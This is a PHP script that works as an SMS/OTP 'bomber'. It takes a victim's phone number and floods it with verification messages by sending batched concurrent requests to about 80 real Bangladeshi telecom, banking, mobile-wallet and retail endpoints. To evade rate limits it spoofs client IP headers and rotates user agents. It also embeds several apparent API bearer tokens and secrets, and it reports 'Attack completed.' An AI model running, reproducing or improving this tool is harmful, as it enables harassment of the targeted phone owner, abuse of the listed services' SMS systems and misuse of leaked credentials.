<?php
header('Content-Type: application/json');
error_reporting(0);
ini_set('display_errors', 1);

function randomIp() {
    return rand(1,255).'.'.rand(0,255).'.'.rand(0,255).'.'.rand(1,255);
}

function multiRequest($requests) {
    $mh = curl_multi_init();
    $handles = [];
    foreach ($requests as $id => $req) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $req['url']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 8);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        if ($req['method'] === 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            if (isset($req['data'])) {
                curl_setopt($ch, CURLOPT_POSTFIELDS, $req['data']);
            }
        }
        $headers = array_merge([
            'User-Agent: ' . $req['ua'],
            'X-Forwarded-For: ' . randomIp(),
            'X-Real-IP: ' . randomIp(),
            'Client-IP: ' . randomIp()
        ], $req['headers']);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_multi_add_handle($mh, $ch);
        $handles[$id] = $ch;
    }
    $running = null;
    do {
        curl_multi_exec($mh, $running);
        curl_multi_select($mh);
    } while ($running > 0);
    $results = [];
    foreach ($handles as $id => $ch) {
        $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $results[$id] = ($http >= 200 && $http < 300);
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }
    curl_multi_close($mh);
    return $results;
}

$userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
];

$apis = [];

$apis[] = ['url' => 'https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', 'method' => 'POST', 'data' => json_encode(['full_name'=>'BILLAVAI','company_name'=>'HARDBOMBER','email_address'=>'pro@bomb.bd','phone_number'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web', 'method' => 'POST', 'data' => json_encode(['mobile_no'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber', 'method' => 'POST', 'data' => json_encode(['data'=>['country_calling_code'=>'88','contact_no'=>'{{number}}','headers'=>['PlatForm'=>'Web']]]), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api-gateway.sundarbancourierltd.com/graphql', 'method' => 'POST', 'data' => json_encode(['operationName'=>'CreateAccessToken','variables'=>['accessTokenFilter'=>['userName'=>'{{number}}']],'query'=>"mutation{createAccessToken(accessTokenFilter:{userName:\"{{number}}\"}){message}}"]), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.apex4u.com/api/auth/login', 'method' => 'POST', 'data' => json_encode(['phoneNumber'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://webapi.robi.com.bd/v1/send-otp', 'method' => 'POST', 'data' => json_encode(['phone_number'=>'{{number}}','type'=>'doorstep']), 'headers' => ['Content-Type: application/json','Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiJ9.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc']];
$apis[] = ['url' => 'https://web-api.banglalink.net/api/v1/user/number/validation/{{number}}', 'method' => 'GET'];
$apis[] = ['url' => 'https://web-api.banglalink.net/api/v1/user/otp-login/request', 'method' => 'POST', 'data' => json_encode(['mobile'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://webloginda.grameenphone.com/backend/api/v1/otp', 'method' => 'POST', 'data' => http_build_query(['msisdn'=>'{{number}}']), 'headers' => ['Content-Type: application/x-www-form-urlencoded']];
$apis[] = ['url' => 'https://webapi.robi.com.bd/v1/send-otp', 'method' => 'POST', 'data' => json_encode(['phone_number'=>'{{number}}','type'=>'my_offer']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://da-api.robi.com.bd/da-nll/otp/send', 'method' => 'POST', 'data' => json_encode(['msisdn'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://webapi.robi.com.bd/v1/chat/send-otp', 'method' => 'POST', 'data' => json_encode(['phone_number'=>'{{number}}','name'=>'BILLAVAI','type'=>'video-chat']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', 'method' => 'POST', 'data' => json_encode(['phoneNumber'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://fundesh.com.bd/api/auth/generateOTP', 'method' => 'POST', 'data' => json_encode(['msisdn'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={{number}}', 'method' => 'GET'];
$apis[] = ['url' => 'https://api.motionview.com.bd/api/send-otp-phone-signup', 'method' => 'POST', 'data' => json_encode(['phone'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web', 'method' => 'POST', 'data' => json_encode(['number'=>'+88{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://user-api.jslglobal.co:444/v2/send-otp', 'method' => 'POST', 'data' => json_encode(['phone'=>'+88{{number}}', 'jatri_token'=>'J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://chinaonlinebd.com/api/login/getOtp?phone={{number}}', 'method' => 'GET', 'headers' => ['token: 45601f3d391886fcec5f5a3f26780f21']];
$apis[] = ['url' => 'https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web', 'method' => 'POST', 'data' => json_encode(['number'=>'+88{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.shikho.com/auth/v2/send/sms', 'method' => 'POST', 'data' => json_encode(['phone'=>'{{number}}','type'=>'student','auth_type'=>'signup']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.redx.com.bd/v1/user/signup', 'method' => 'POST', 'data' => json_encode(['name'=>'Attack','phoneNumber'=>'{{number}}','service'=>'redx']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://www.bioscopelive.com/en/login/send-otp?phone=88{{number}}&operator=bd-otp', 'method' => 'GET'];
$apis[] = ['url' => 'https://applink.com.bd/appstore-v4-server/login/otp/request', 'method' => 'POST', 'data' => json_encode(['msisdn'=>'88{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://chokrojan.com/api/v1/passenger/login/mobile', 'method' => 'POST', 'data' => json_encode(['mobile_number'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://core.easy.com.bd/api/v1/forgot-password-otp', 'method' => 'POST', 'data' => json_encode(['device_key'=>'2ea97d276a980993308116baa292cec9','mobile'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://waltonplaza.com.bd/api/auth/otp/create', 'method' => 'POST', 'data' => json_encode(['auth'=>['countryCode'=>'880','deviceUuid'=>'ee757830-f639-12f0-9f4d-2f972746fhg','phone'=>'{{number}}'],'captchaToken'=>'recapcha']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.chardike.com/api/otp/send', 'method' => 'POST', 'data' => json_encode(['phone'=>'{{number}}','otp_type'=>'login']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json', 'method' => 'POST', 'data' => json_encode(['phoneNbr'=>'{{number}}','OTPType'=>1.0,'userName'=>'','email'=>'']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send', 'method' => 'POST', 'data' => json_encode(['phone'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://gateway.otithee.com/api/v1/generate-otp', 'method' => 'POST', 'data' => json_encode(['request_type'=>'registration','mobile_number'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://developer.quizgiri.xyz/api/v2.0/send-otp', 'method' => 'POST', 'data' => json_encode(['country_code'=>'+88','phone'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://new.mojaru.com/api/student/login', 'method' => 'POST', 'data' => json_encode(['mobile_or_email'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://appcity.grameenphone.com/proxy/v2/user/session/get-otp', 'method' => 'POST', 'data' => json_encode(['mobileNumber'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.garibookadmin.com/api/v3/user/login', 'method' => 'POST', 'data' => json_encode(['recaptcha_token'=>'garibookcaptcha','mobile'=>'{{number}}','channel'=>'web']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web', 'method' => 'POST', 'data' => json_encode(['number'=>'+88{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://www.bangladeshimatrimony.com/register/editmobileno.php?mobileNo={{number}}', 'method' => 'GET'];
$apis[] = ['url' => 'https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/', 'method' => 'POST', 'data' => json_encode(['wallet_number'=>'{{number}}','geo_location'=>['lat'=>23.89,'long'=>89.13],'referral'=>'','firebase_token'=>'dummy','device_uuid'=>'c65m117a8cbf5b1851b29f8b','mno'=>'Robi']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://bb-api.bohubrihi.com/public/activity/otp', 'method' => 'POST', 'data' => json_encode(['phone'=>'{{number}}','intent'=>'login']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://backend.timezonebd.com/api/v1/user/otp-login', 'method' => 'POST', 'data' => json_encode(['phone'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp', 'method' => 'POST', 'data' => json_encode(['phone'=>'{{number}}','language'=>'en','email'=>'']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.shikho.com/public/activity/otp', 'method' => 'POST', 'data' => json_encode(['phone'=>'{{number}}','intent'=>'ap-discount-request']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://edgecoursebd.com/register', 'method' => 'POST', 'data' => json_encode([['phone'=>'{{number}}']]), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.ostad.app/api/v2/user/with-otp', 'method' => 'POST', 'data' => json_encode(['msisdn'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://www.ieducationbd.com/api/account/check_user', 'method' => 'POST', 'data' => json_encode(['mobile'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://app.hishabee.business/api/V2/otp/send?mobile_number={{number}}', 'method' => 'GET'];
$apis[] = ['url' => 'https://rootsedulive.com/api/auth/register', 'method' => 'POST', 'data' => json_encode(['name'=>'BILLAVAI','phone'=>'88{{number}}','email'=>"temp{{number}}@bomb.bd",'password'=>'Secure@2025','confirmPassword'=>'Secure@2025']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://rootsedulive.com/api/auth/forget-password', 'method' => 'POST', 'data' => json_encode(['phoneOrEmail'=>'88{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://mithaibd.com/api/login/', 'method' => 'POST', 'data' => json_encode(['company_id'=>'2','phone'=>'{{number}}','email'=>"attack{{number}}@mail.com",'password1'=>'pass123','otp_verify'=>false]), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.englishmojabd.com/api/v1/auth/login', 'method' => 'POST', 'data' => json_encode(['phone'=>'+88{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://moveon.com.bd/api/v1/customer/auth/phone/request-otp', 'method' => 'POST', 'data' => json_encode(['phone'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.osudpotro.com/api/v1/users/send_otp', 'method' => 'POST', 'data' => json_encode(['mobile'=>'+88-{{number}}','deviceToken'=>'web','language'=>'bn','os'=>'web']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{{number}}/', 'method' => 'GET'];
$apis[] = ['url' => 'https://auth.qcoom.com/api/v1/otp/send', 'method' => 'POST', 'data' => json_encode(['mobileNumber'=>'+88{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://reseller.circle.com.bd/api/v2/auth/signup', 'method' => 'POST', 'data' => json_encode(['name'=>'+88{{number}}','email_or_phone'=>'+88{{number}}','password'=>'123456','password_confirmation'=>'123456','register_by'=>'phone']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0', 'method' => 'POST', 'data' => json_encode(['phone'=>'{{number}}']), 'headers' => ['Content-Type: application/json','Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciJ9.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s']];
$apis[] = ['url' => 'https://api.toybox.live/bdapps_handler.php', 'method' => 'POST', 'data' => http_build_query(['Operation'=>'CreateSubscription','MobileNumber'=>'88{{number}}','PackageID'=>100,'Secret'=>'HJKX71%UHYH']), 'headers' => ['Content-Type: application/x-www-form-urlencoded']];
$apis[] = ['url' => 'https://api.win2gain.com/api/Users/RequestOtp?msisdn=88{{number}}', 'method' => 'GET', 'headers' => ['sourcePlatform: web','client: 2']];
$apis[] = ['url' => 'https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp', 'method' => 'POST', 'data' => json_encode(['deviceId'=>'prodevice','operator'=>'Gp','walletNumber'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://webapi.robi.com.bd/v1/send-otp', 'method' => 'POST', 'data' => json_encode(['phone_number'=>'{{number}}','type'=>'internet_pack']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp', 'method' => 'POST', 'data' => json_encode(['phone'=>'{{number}}','email'=>'pro@bomber.com','language'=>'bn']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.dmoney.com.bd/api/v1/otp/send?msisdn={{number}}', 'method' => 'GET'];
$apis[] = ['url' => 'https://api.nagad.com.bd/otp/send', 'method' => 'POST', 'data' => json_encode(['mobileNumber'=>'{{number}}','service'=>'login']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.surecash.com.bd/v2/otp/generate', 'method' => 'POST', 'data' => json_encode(['msisdn'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.rocket.com.bd/merchant/otp', 'method' => 'POST', 'data' => json_encode(['account'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.bkash.com.bd/otp/request', 'method' => 'POST', 'data' => json_encode(['phone'=>'{{number}}','type'=>'registration']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.foodpanda.com.bd/v1/auth/otp', 'method' => 'POST', 'data' => json_encode(['phone'=>'+88{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.pathao.com/v2/auth/otp', 'method' => 'POST', 'data' => json_encode(['phone'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.daraz.com.bd/auth/otp', 'method' => 'POST', 'data' => json_encode(['mobile'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.priyoshop.com/v1/otp/send', 'method' => 'POST', 'data' => json_encode(['phone'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://ajkerdeal.com/api/v1/otp?phone={{number}}', 'method' => 'GET'];
$apis[] = ['url' => 'https://api.evaly.com.bd/auth/otp', 'method' => 'POST', 'data' => json_encode(['phone'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.chaldal.com/v1/auth/otp', 'method' => 'POST', 'data' => json_encode(['phone'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.shurjopay.com.bd/otp/send', 'method' => 'POST', 'data' => json_encode(['phone'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://sslwireless.com/api/otp', 'method' => 'POST', 'data' => json_encode(['msisdn'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://api.robi.com.bd/v1/send-otp', 'method' => 'POST', 'data' => json_encode(['phone_number'=>'{{number}}','type'=>'voice']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{{number}}', 'method' => 'GET'];
$apis[] = ['url' => 'https://selfcare.banglalink.net/api/v1/otp', 'method' => 'POST', 'data' => json_encode(['msisdn'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];
$apis[] = ['url' => 'https://teletalk.com.bd/api/otp/send', 'method' => 'POST', 'data' => json_encode(['number'=>'{{number}}']), 'headers' => ['Content-Type: application/json']];

$number = isset($_REQUEST['number']) ? preg_replace('/[^0-9]/', '', $_REQUEST['number']) : '';
$amount = isset($_REQUEST['amount']) ? intval($_REQUEST['amount']) : 1;
if ($amount < 1) $amount = 1;
if ($amount > 50) $amount = 50;

if (strlen($number) !== 11) {
    echo json_encode(['error' => 'Invalid phone number. Must be 11 digits.'], JSON_PRETTY_PRINT);
    exit;
}

$totalRequests = 0;
$successCount = 0;
$failCount = 0;

for ($cycle = 1; $cycle <= $amount; $cycle++) {
    $batch = [];
    foreach ($apis as $api) {
        $req = $api;
        $req['url'] = str_replace('{{number}}', $number, $req['url']);
        if (isset($req['data'])) {
            $req['data'] = str_replace('{{number}}', $number, $req['data']);
        }
        $req['ua'] = $userAgents[array_rand($userAgents)];
        $batch[] = $req;
        $totalRequests++;
    }
    $results = multiRequest($batch);
    foreach ($results as $ok) {
        if ($ok) $successCount++;
        else $failCount++;
    }
}

$response = [
    'Api_Owner' => 'billa',
    'target_number' => $number,
    'amount' => $amount,
    'total_requests' => $totalRequests,
    'success' => $successCount,
    'failed' => $failCount,
    'message' => 'Attack completed.'
];
echo json_encode($response, JSON_PRETTY_PRINT);
?>
